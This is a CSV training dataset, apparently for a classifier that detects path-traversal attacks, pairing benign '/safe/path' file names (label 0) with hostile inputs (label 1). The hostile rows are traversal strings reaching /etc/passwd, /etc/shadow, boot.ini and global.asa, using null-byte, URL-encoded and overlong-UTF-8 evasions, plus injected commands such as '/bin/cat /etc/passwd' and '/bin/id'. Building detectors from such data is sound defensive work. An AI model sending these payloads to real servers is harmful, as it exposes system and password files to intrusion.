Sentence,Label
/safe/path/file248.html,0
/safe/path/file546.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
%0a/bin/cat%20/etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1472.html,0
/safe/path/file1341.html,0
/safe/path/file364.html,0
/safe/path/file594.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1470.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file367.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file445.html,0
/safe/path/file1426.html,0
/safe/path/file285.html,0
/safe/path/file1451.html,0
/safe/path/file996.html,0
/safe/path/file1804.html,0
/safe/path/file1139.html,0
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1744.html,0
/safe/path/file485.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1108.html,0
/safe/path/file1140.html,0
/safe/path/file1395.html,0
/safe/path/file1339.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
C:/inetpub/wwwroot/global.asa,1
C:/inetpub/wwwroot/global.asa,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
C:\boot.ini,1
%00../../../../../../etc/passwd,1
/safe/path/file901.html,0
/safe/path/file748.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file746.html,0
/../../../../../../../../../../etc/passwd,1
%0a/bin/cat%20/etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1465.html,0
/safe/path/file621.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1182.html,0
../../../../../../../../../../../../boot.ini%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file553.html,0
/safe/path/file1278.html,0
%00../../../../../../etc/passwd,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file492.html,0
../../../../../../../../../../../../etc/passwd,1
/safe/path/file1062.html,0
/../../../../../../../../../../etc/shadow,1
/../../../../../../../../../../../boot.ini%00.html,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file126.html,0
/safe/path/file832.html,0
/./././././././././././etc/shadow,1
../../boot.ini,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
../../../../../../../../../../../../boot.ini%00,1
/../../../../../../../../bin/id|,1
/safe/path/file301.html,0
/safe/path/file564.html,0
/safe/path/file518.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../boot.ini,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file865.html,0
/safe/path/file997.html,0
/safe/path/file1683.html,0
/safe/path/file204.html,0
/safe/path/file831.html,0
/safe/path/file1913.html,0
../../../../../../../../../../../../localstart.asp,1
/safe/path/file264.html,0
/safe/path/file69.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
%00../../../../../../etc/passwd,1
../../../../../../../../../../../../boot.ini%00,1
/../../../../../../../../../../etc/shadow,1
/safe/path/file460.html,0
/safe/path/file467.html,0
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file36.html,0
/safe/path/file1909.html,0
/safe/path/file1968.html,0
/safe/path/file969.html,0
../../../../../../../../../../../../boot.ini,1
/safe/path/file1574.html,0
%00/etc/shadow%00,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1954.html,0
/safe/path/file1612.html,0
%00../../../../../../etc/shadow,1
/../../../../../../../../../../etc/shadow^^,1
%0a/bin/cat%20/etc/passwd,1
C:\boot.ini,1
/safe/path/file1374.html,0
/safe/path/file433.html,0
/safe/path/file1686.html,0
/safe/path/file1094.html,0
/safe/path/file1476.html,0
/safe/path/file1697.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file697.html,0
/safe/path/file1414.html,0
/safe/path/file974.html,0
%00/etc/passwd%00,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file1124.html,0
/safe/path/file1609.html,0
C:\boot.ini,1
/safe/path/file1633.html,0
/safe/path/file1356.html,0
/safe/path/file499.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file168.html,0
/safe/path/file1352.html,0
